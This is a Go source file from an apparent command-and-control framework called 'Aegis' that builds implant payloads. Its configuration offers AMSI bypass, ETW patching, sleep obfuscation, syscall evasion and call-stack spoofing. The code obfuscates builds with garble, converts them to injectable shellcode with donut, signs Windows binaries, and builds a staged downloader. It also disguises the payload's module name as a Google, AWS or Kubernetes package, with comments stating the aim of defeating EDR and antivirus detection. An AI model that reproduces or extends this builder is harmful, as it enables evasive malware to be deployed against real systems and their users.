package builder

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"text/template"

	servercrypto "github.com/aegis-c2/aegis/server/crypto"
)

// OutputFormat 定义了 Payload 的输出格式。
type OutputFormat string

const (
	FormatExecutable  OutputFormat = "exe"
	FormatSharedLib OutputFormat = "shared"
	FormatService     OutputFormat = "svc"
	FormatShellcode   OutputFormat = "shellcode" // PIE 二进制，可用 donut/sRDI 转为 shellcode
)

// BuildConfig 是一次 Payload 构建的完整配置。
// 借鉴 Sliver 的 ImplantConfig 模型：每个 binary 独立配置。
type BuildConfig struct {
	Name              string       // Payload 名称
	GOOS              string       // 目标 OS (windows/linux)
	GOARCH            string       // 目标架构 (amd64)
	Format            OutputFormat // 输出格式
	ServerURL         string       // C2 服务器地址
	HeartbeatInterval int          // 心跳间隔（秒）
	HeartbeatJitter   int          // 心跳抖动范围（秒）
	UserAgent         string       // HTTP User-Agent 伪装
	ProcessName       string       // 进程伪装名称
	SleepMaskEnabled  bool          // 是否启用睡眠混淆
	SyscallEnabled    bool          // 是否启用间接 Syscall
	TLSInsecure       bool          // 是否跳过 TLS 证书验证（默认 false）
	KillDate          string        // 自毁日期 (YYYY-MM-DD)，空字符串表示不启用

	// Profile 相关
	ProfileName     string            // 使用的 C2 Profile 名称
	ProfileMethod   string            // HTTP 方法
	ProfilePath     string            // 请求路径
	ProfileHeaders  map[string]string // 自定义头
	ProfileCookie   string            // Cookie 名称
	ProfileParam    string            // 参数名
	ProfileTransform string           // 数据编码方式

	// Build 相关
	BuildTags     string // 编译标签
	CGOEnabled    bool   // 是否启用 CGO
	UseGarble     bool   // 是否使用 garble 混淆（需要 garble 已安装）
	RenameImports bool   // 是否重命名导入路径（规避静态分析）

	// 代码签名（Windows PE）
	SignCertPath string // PFX/PEM 证书路径
	SignKeyPath  string // 私钥路径
	SignTimestamp bool  // 是否添加时间戳（推荐，证书过期后签名仍有效）

	// Evasion
	AMSIEnabled    bool   // AMSI 是否启用（false = bypass）
	ETWEnabled     bool   // ETW 是否启用（false = patch）
	TLSFingerprint string // JA3/JA4 指纹（chrome_120/firefox_120/randomized）
	StackSpoof     bool   // 是否启用调用栈欺骗
	SleepTechnique string // none/ekko/foliage
	TransportType  string // http/websocket/dns/namedpipe
	RotationStrategy string // round-robin/random/failover

	// Staged delivery
	StageType string // "" (stageless) / "stager" / "shellcode"
}

// Builder 是动态编译引擎的核心。
type Builder struct {
	rsaKeyPair   *servercrypto.RSAKeyPair
	ecdhKeyPair  *servercrypto.ECDHKeyPair
	templateDir  string
	outputDir    string
	projectRoot  string
}

// New 创建 Builder 实例。
func New(rsaKeys *servercrypto.RSAKeyPair, templateDir, outputDir, projectRoot string) (*Builder, error) {
	ecdhKeys, err := servercrypto.GenerateECDHKeyPair()
	if err != nil {
		return nil, fmt.Errorf("generate ECDH key pair: %w", err)
	}
	return &Builder{
		rsaKeyPair:   rsaKeys,
		ecdhKeyPair:  ecdhKeys,
		templateDir:  templateDir,
		outputDir:    outputDir,
		projectRoot:  projectRoot,
	}, nil
}

// NewWithECDH 创建 Builder 实例并指定 ECDH 密钥对。
func NewWithECDH(rsaKeys *servercrypto.RSAKeyPair, ecdhKeys *servercrypto.ECDHKeyPair, templateDir, outputDir, projectRoot string) *Builder {
	return &Builder{
		rsaKeyPair:   rsaKeys,
		ecdhKeyPair:  ecdhKeys,
		templateDir:  templateDir,
		outputDir:    outputDir,
		projectRoot:  projectRoot,
	}
}

// Build 执行一次完整的 Payload 编译。
func (b *Builder) Build(cfg *BuildConfig) (string, error) {
	// 1. 为此次构建创建临时项目目录
	buildDir, err := b.createBuildDir(cfg.Name)
	if err != nil {
		return "", fmt.Errorf("create build dir: %w", err)
	}
	defer os.RemoveAll(buildDir)

	// 3. 渲染 Agent 源码模板（agent 运行时自行生成 AES 密钥）
	err = b.renderSource(buildDir, cfg, nil)
	if err != nil {
		return "", fmt.Errorf("render source: %w", err)
	}

	// 4. 写入 go.mod
	err = b.writeGoMod(buildDir, cfg)
	if err != nil {
		return "", err
	}

	// 5. 同步依赖（生成 go.sum，解决 require 校验问题）
	if err := b.modTidy(buildDir, cfg); err != nil {
		return "", fmt.Errorf("go mod tidy: %w", err)
	}

	// 6. 执行 go build
	outputPath, err := b.compile(cfg, buildDir)
	if err != nil {
		return "", fmt.Errorf("compile: %w", err)
	}

	// 6. 代码签名（仅 Windows PE）
	if cfg.GOOS == "windows" && cfg.SignCertPath != "" {
		signedPath, err := b.signPE(outputPath, cfg)
		if err != nil {
			return "", fmt.Errorf("sign PE: %w", err)
		}
		outputPath = signedPath
	}

	return outputPath, nil
}

func (b *Builder) createBuildDir(name string) (string, error) {
	// S-P0-3: 路径遍历防护 — 清理名称防止 ../ 攻击
	safeName := filepath.Clean(name)
	if strings.Contains(safeName, "..") || filepath.IsAbs(safeName) {
		return "", fmt.Errorf("invalid payload name %q: path traversal not allowed", name)
	}

	dir := filepath.Join(b.outputDir, safeName)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return "", err
	}
	// 创建子目录
	for _, sub := range []string{"cmd", "internal", "modules", "transport", "crypto", "syscall", "sleep", "inject", "bof", "session", "config"} {
		if err := os.MkdirAll(filepath.Join(dir, sub), 0755); err != nil {
			return "", err
		}
	}
	return dir, nil
}

// renderSource 渲染 Agent 源码。
// 核心思路：将 Agent 模板文件复制到构建目录，用 text/template 注入配置值。
func (b *Builder) renderSource(buildDir string, cfg *BuildConfig, aesKey []byte) error {
	// N-P0-3: AES 密钥由 agent 端运行时生成并通过 RSA 加密发送给 server，
	// builder 不嵌入任何密钥材料。
	_ = aesKey // 仅用于验证传入的 aesKey 参数有效

	// Server 公钥 PEM（需要转义用于 Go 字符串）
	serverPubKey := string(b.rsaKeyPair.PublicKeyPEM())

	// Server X25519 公钥 hex（32 字节，用于 ECDH 密钥交换）
	serverECDHPubKeyHex := ""
	if b.ecdhKeyPair != nil {
		serverECDHPubKeyHex = b.ecdhKeyPair.PublicKeyHex()
	}

	// 序列化 ProfileHeaders map 为 pipe-delimited 字符串
	var profileHeadersStr string
	if cfg.ProfileHeaders != nil {
		var parts []string
		for k, v := range cfg.ProfileHeaders {
			parts = append(parts, k+":"+v)
		}
		profileHeadersStr = strings.Join(parts, "|")
	}

	// 渲染 main.go 模板
	mainTpl, err := template.New("main").Parse(agentMainTemplate)
	if err != nil {
		return err
	}

	var buf bytes.Buffer
	err = mainTpl.Execute(&buf, struct {
		Config             *BuildConfig
		AESKeyEncrypted    string
		ServerPubKey       string
		ServerECDHPubKey   string
		ProfileHeadersStr  string
		TransportType      string
		SleepTechnique     string
		AMSIEnabled        bool
		ETWEnabled         bool
		TLSFingerprint     string
		StackSpoof         bool
		RotationStrategy   string
	}{
		Config:             cfg,
		AESKeyEncrypted:    "", // N-P0-3: agent generates its own AES key at runtime
		ServerPubKey:       serverPubKey,
		ServerECDHPubKey:   serverECDHPubKeyHex,
		ProfileHeadersStr:  profileHeadersStr,
		TransportType:      cfg.TransportType,
		SleepTechnique:     cfg.SleepTechnique,
		AMSIEnabled:        cfg.AMSIEnabled,
		ETWEnabled:         cfg.ETWEnabled,
		TLSFingerprint:     cfg.TLSFingerprint,
		StackSpoof:         cfg.StackSpoof,
		RotationStrategy:   cfg.RotationStrategy,
	})
	if err != nil {
		return err
	}

	// 将 __BACKTICK__ 占位符替换为真实反引号（Go 原始字符串字面量不能包含反引号）
	source := strings.ReplaceAll(buf.String(), "__BACKTICK__", "`")

	mainPath := filepath.Join(buildDir, "cmd", "main.go")
	return os.WriteFile(mainPath, []byte(source), 0644)
}

func (b *Builder) writeGoMod(buildDir string, cfg *BuildConfig) error {
	moduleName := "aegis-agent"
	if cfg.RenameImports {
		moduleName = genFakeModuleName()
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("module %s\n\ngo 1.25\n", moduleName))

	// Replace directive: point to project root so generated code
	// can import github.com/aegis-c2/aegis/agent/... packages.
	if b.projectRoot != "" {
		sb.WriteString("\nreplace github.com/aegis-c2/aegis => " + b.projectRoot + "\n")
	}

	// Require the project module (the replace directive resolves it).
	sb.WriteString("\nrequire github.com/aegis-c2/aegis v0.0.0\n")

	return os.WriteFile(filepath.Join(buildDir, "go.mod"), []byte(sb.String()), 0644)
}

// modTidy 在构建目录中执行 go mod tidy，生成 go.sum。
func (b *Builder) modTidy(buildDir string, cfg *BuildConfig) error {
	cmd := exec.Command("go", "mod", "tidy")
	cmd.Dir = buildDir

	samePlatform := cfg.GOOS == runtime.GOOS && cfg.GOARCH == runtime.GOARCH
	if !samePlatform {
		cmd.Env = append(os.Environ(),
			"GOOS="+cfg.GOOS,
			"GOARCH="+cfg.GOARCH,
			"CGO_ENABLED=0",
		)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("go mod tidy failed: %s\n%s", err, string(output))
	}
	return nil
}

func (b *Builder) compile(cfg *BuildConfig, buildDir string) (string, error) {
	// S-P0-3: 清理 cfg.Name 防止路径穿越
	safeName := filepath.Clean(cfg.Name)
	if strings.Contains(safeName, "..") || filepath.IsAbs(safeName) {
		return "", fmt.Errorf("invalid payload name %q: path traversal not allowed", cfg.Name)
	}

	// 确定输出文件名
	var ext string
	switch cfg.GOOS {
	case "windows":
		ext = ".exe"
	}

	// 确保输出文件使用绝对路径
	var outputFile string
	switch cfg.Format {
	case FormatExecutable:
		outputFile = filepath.Join(b.outputDir, safeName+ext)
	case FormatSharedLib:
		if cfg.GOOS == "windows" {
			outputFile = filepath.Join(b.outputDir, safeName+".dll")
		} else {
			outputFile = filepath.Join(b.outputDir, "lib"+safeName+".so")
		}
	case FormatShellcode:
		outputFile = filepath.Join(b.outputDir, safeName+".pie"+ext)
	default:
		outputFile = filepath.Join(b.outputDir, safeName+ext)
	}
	if !filepath.IsAbs(outputFile) {
		outputFile, _ = filepath.Abs(outputFile)
	}

	// 确保输出目录存在
	os.MkdirAll(filepath.Dir(outputFile), 0755)

	// 构建命令
	var cmdName string
	var args []string

	if cfg.UseGarble {
		cmdName = "garble"
		// Garble 0.16+: flags must precede command
		args = append(args, "-seed=random", "-literals", "-tiny",
			"build", "-ldflags", "-s -w -buildid=")
		switch cfg.Format {
		case FormatExecutable:
			args = append(args, "-trimpath")
		case FormatSharedLib:
			args = append(args, "-buildmode=c-shared")
		case FormatShellcode:
			args = append(args, "-buildmode=pie", "-trimpath")
		}
	} else {
		cmdName = "go"
		args = append(args, "build", "-ldflags", "-s -w -buildid=")
		switch cfg.Format {
		case FormatSharedLib:
			args = append(args, "-buildmode=c-shared")
		case FormatExecutable:
			args = append(args, "-trimpath")
		case FormatShellcode:
			args = append(args, "-buildmode=pie", "-trimpath")
		}
	}

	// Pass -tags if configured (e.g., "evasion,nocgo")
	if cfg.BuildTags != "" {
		args = append(args, "-tags", cfg.BuildTags)
	}

	args = append(args, "-o", outputFile)
	args = append(args, "./cmd")

	cmd := exec.Command(cmdName, args...)
	cmd.Dir = buildDir

	// 跨平台编译需要设置目标环境
	samePlatform := cfg.GOOS == runtime.GOOS && cfg.GOARCH == runtime.GOARCH
	cgoNeeded := cfg.Format == FormatSharedLib

	if !samePlatform {
		cmd.Env = append(os.Environ(),
			"GOOS="+cfg.GOOS,
			"GOARCH="+cfg.GOARCH,
		)
		if cgoNeeded {
			// cross-compile with CGO needs a cross-compiler toolchain
			return "", fmt.Errorf("cross-compiling shared library (%s/%s) requires CGO but no cross-compiler configured", cfg.GOOS, cfg.GOARCH)
		}
		cmd.Env = append(cmd.Env, "CGO_ENABLED=0")
	} else if cgoNeeded {
		cmd.Env = append(os.Environ(), "CGO_ENABLED=1")
	} else if cfg.GOOS == "windows" && cfg.GOARCH == "amd64" {
		// Same-platform Windows amd64: evasion/injection/sleep obfuscation
		// all require CGO (bypass_windows.go, unhook_windows.go, etc.)
		cmd.Env = append(os.Environ(), "CGO_ENABLED=1")
	}

	// Garble 环境变量：GOGARBLE=* 表示混淆所有包（Sliver 模式）
	if cfg.UseGarble {
		if cmd.Env == nil {
			cmd.Env = os.Environ()
		}
		cmd.Env = append(cmd.Env, "GOGARBLE=*")
	}

	// 检查 garble 是否可用
	if cfg.UseGarble {
		checkCmd := exec.Command("garble", "version")
		if err := checkCmd.Run(); err != nil {
			return "", fmt.Errorf("garble not found in PATH. Install with: go install mvdan.cc/garble@latest")
		}
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s build failed: %s\n%s", cmdName, err, string(output))
	}

	// Shellcode 格式：使用 Donut 将 PIE 二进制转为位置无关 shellcode
	if cfg.Format == FormatShellcode {
		shellcodePath, err := b.convertToShellcode(outputFile, cfg)
		if err != nil {
			return "", fmt.Errorf("shellcode conversion: %w", err)
		}
		outputFile = shellcodePath
	}

	// 编译后验证
	if err := b.validateBinary(outputFile, cfg); err != nil {
		return "", fmt.Errorf("post-build validation: %w", err)
	}

	return outputFile, nil
}

// signPE 使用 osslsigncode 对 Windows PE 文件进行代码签名。
// 支持 PFX 证书和 PEM+KEY 分离格式。
func (b *Builder) signPE(inputPath string, cfg *BuildConfig) (string, error) {
	// 检查 osslsigncode 是否可用
	if _, err := exec.LookPath("osslsigncode"); err != nil {
		return "", fmt.Errorf("osslsigncode not found in PATH. Install: apt install osslsigncode (Linux) or brew install osslsigncode (MacOS). Windows: choco install osslsigncode")
	}

	outputPath := inputPath + ".signed"
	args := []string{
		"sign",
		"-certs", cfg.SignCertPath,
		"-key", cfg.SignKeyPath,
		"-n", "Aegis", // 签名显示名称
		"-in", inputPath,
		"-out", outputPath,
	}

	if cfg.SignTimestamp {
		// 添加时间戳服务器（证书过期后签名仍有效）
		args = append(args,
			"-t", "http://timestamp.digicert.com",
			"-addUnauthenticatedInfo",
		)
	}

	cmd := exec.Command("osslsigncode", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("osslsigncode failed: %s\n%s", err, string(output))
	}

	// 验证签名
	verifyCmd := exec.Command("osslsigncode", "verify", "-in", outputPath)
	if output, err := verifyCmd.CombinedOutput(); err != nil {
		// 验证失败但签名可能仍有效（如自签名证书），继续
		if !strings.Contains(string(output), "Signature verification: ok") {
			return "", fmt.Errorf("signature verification failed: %s", string(output))
		}
	}

	// 替换原始文件
	if err := os.Remove(inputPath); err != nil {
		return "", fmt.Errorf("remove unsigned file: %w", err)
	}

	return outputPath, nil
}

// BuildStage1 执行 Stage1（引导器）构建。
// Stage1 是一个小体积下载器，连接 C2 获取 stage2 的外部下载地址。
func (b *Builder) BuildStage1(cfg *BuildConfig) (string, error) {
	// 1. 创建临时构建目录
	buildDir, err := b.createBuildDir(cfg.Name + "-stage1")
	if err != nil {
		return "", fmt.Errorf("create build dir: %w", err)
	}
	defer os.RemoveAll(buildDir)

	// 2. 渲染 Stage1 模板
	mainTpl, err := template.New("stage1").Parse(stage1Template)
	if err != nil {
		return "", err
	}

	var buf strings.Builder
	err = mainTpl.Execute(&buf, struct {
		C2URL string
		GOOS  string
	}{
		C2URL: cfg.ServerURL,
		GOOS:  cfg.GOOS,
	})
	if err != nil {
		return "", err
	}

	mainPath := filepath.Join(buildDir, "cmd", "main.go")
	if err := os.WriteFile(mainPath, []byte(buf.String()), 0644); err != nil {
		return "", err
	}

	// 3. 写入最简 go.mod（无 replace，纯标准库）
	gomod := `module stage1

go 1.25
`
	if err := os.WriteFile(filepath.Join(buildDir, "go.mod"), []byte(gomod), 0644); err != nil {
		return "", err
	}

	// 4. 编译
	var ext string
	if cfg.GOOS == "windows" {
		ext = ".exe"
	}
	outputFile := filepath.Join(b.outputDir, filepath.Clean(cfg.Name)+"-stage1"+ext)
	// 确保使用绝对路径
	if !filepath.IsAbs(outputFile) {
		outputFile, _ = filepath.Abs(outputFile)
	}

	var cmdName string
	var args []string

	if cfg.UseGarble {
		cmdName = "garble"
		args = []string{"-seed=random", "-literals", "-tiny",
			"build", "-ldflags", "-s -w -buildid=", "-trimpath", "-o", outputFile, "./cmd"}
	} else {
		cmdName = "go"
		args = []string{"build", "-ldflags", "-s -w -buildid=", "-trimpath", "-o", outputFile, "./cmd"}
	}

	cmd := exec.Command(cmdName, args...)
	cmd.Dir = buildDir

	samePlatform := cfg.GOOS == runtime.GOOS && cfg.GOARCH == runtime.GOARCH
	if !samePlatform {
		cmd.Env = append(os.Environ(),
			"GOOS="+cfg.GOOS,
			"GOARCH="+cfg.GOARCH,
			"CGO_ENABLED=0",
		)
	}

	if cfg.UseGarble {
		if cmd.Env == nil {
			cmd.Env = os.Environ()
		}
		cmd.Env = append(cmd.Env, "GOGARBLE=*")
		checkCmd := exec.Command("garble", "version")
		if err := checkCmd.Run(); err != nil {
			return "", fmt.Errorf("garble not found in PATH")
		}
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("%s build failed: %s\n%s", cmdName, err, string(output))
	}

	return outputFile, nil
}

// BuildStage2 执行 Stage2（完整 implant）构建。
// Stage2 是独立运行的 implant，复用现有 Build() 方法。
func (b *Builder) BuildStage2(cfg *BuildConfig) (string, error) {
	return b.Build(cfg)
}

// validateBinary 编译后验证：检查 PE/ELF 头、文件大小、基本完整性。
func (b *Builder) validateBinary(path string, cfg *BuildConfig) error {
	info, err := os.Stat(path)
	if err != nil {
		return fmt.Errorf("stat binary: %w", err)
	}

	// 1. 文件大小检查（至少 100KB，防止编译出空文件）
	if info.Size() < 100*1024 {
		return fmt.Errorf("binary too small: %d bytes (expected >100KB)", info.Size())
	}

	// 2. 文件格式验证
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()

	magic := make([]byte, 4)
	if _, err := f.Read(magic); err != nil {
		return fmt.Errorf("read magic: %w", err)
	}

	switch cfg.GOOS {
	case "windows":
		// PE: MZ header
		if magic[0] != 'M' || magic[1] != 'Z' {
			return fmt.Errorf("invalid PE header: expected MZ, got %x", magic[:2])
		}
		// 检查 PE 签名位置（DOS header 的 e_lfanew 在偏移 0x3C）
		f.Seek(0x3C, 0)
		peOff := make([]byte, 4)
		f.Read(peOff)
		off := int(peOff[0]) | int(peOff[1])<<8 | int(peOff[2])<<16 | int(peOff[3])<<24
		f.Seek(int64(off), 0)
		peSig := make([]byte, 4)
		f.Read(peSig)
		if peSig[0] != 'P' || peSig[1] != 'E' {
			return fmt.Errorf("invalid PE signature at offset 0x%x: %x", off, peSig)
		}
	case "linux":
		// ELF: 0x7f 'E' 'L' 'F'
		if magic[0] != 0x7f || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F' {
			return fmt.Errorf("invalid ELF magic: %x", magic)
		}
	}

	return nil
}

// convertToShellcode 使用 Donut 将 PIE 二进制转为位置无关 shellcode。
// 参考 Sliver 的 donut 集成模式：
//   - donut 将 PE/DLL 包装为位置无关的机器码
//   - 生成的 shellcode 可直接注入内存执行
//   - 支持 x64/x84 架构
//
// 如果 donut 不可用，回退到直接读取 PIE 二进制文件。
func (b *Builder) convertToShellcode(inputPath string, cfg *BuildConfig) (string, error) {
	// 检查 donut 是否可用
	if _, err := exec.LookPath("donut"); err != nil {
		// donut 不可用，直接返回 PIE 二进制
		return inputPath, nil
	}

	shellcodePath := inputPath[:len(inputPath)-len(".pie"+filepath.Ext(inputPath))] + ".bin"
	if cfg.GOOS == "windows" {
		shellcodePath = inputPath[:len(inputPath)-len(".pie.exe")] + ".bin"
	} else {
		shellcodePath = inputPath[:len(inputPath)-len(".pie")] + ".bin"
	}

	// donut 参数
	arch := "3" // x64
	if cfg.GOARCH == "386" {
		arch = "1" // x86
	}

	args := []string{
		"-a", arch,
		"-o", shellcodePath,
		inputPath,
	}

	cmd := exec.Command("donut", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// donut 转换失败，回退到 PIE 二进制
		return inputPath, fmt.Errorf("donut conversion failed (using PIE fallback): %s\n%s", err, string(output))
	}

	// 验证 shellcode 文件存在且非空
	info, err := os.Stat(shellcodePath)
	if err != nil || info.Size() == 0 {
		return inputPath, fmt.Errorf("donut produced empty/missing shellcode (using PIE fallback)")
	}

	return shellcodePath, nil
}

// genFakeModuleName 生成看起来像合法软件模块名称的假 module 名。
// 借鉴 Sliver 的 import 重命名策略：
//   - 使用知名公司/项目的内部包命名风格
//   - 避免明显的 C2/malware 相关关键词
//   - EDR/AV 静态分析无法从 module 名识别 Payload 来源
func genFakeModuleName() string {
	prefixes := []string{
		"github.com/googleapis",
		"github.com/aws-sdk",
		"github.com/hashicorp",
		"github.com/prometheus",
		"github.com/elastic",
		"go.opentelemetry.io",
		"go.uber.org",
		"google.golang.org",
		"k8s.io",
		"cloud.google.com",
	}
	buf := make([]byte, 4)
	rand.Read(buf)
	idx := int(buf[0]) % len(prefixes)
	suffix := hex.EncodeToString(buf[1:])
	return prefixes[idx] + "/internal/pkg" + suffix
}
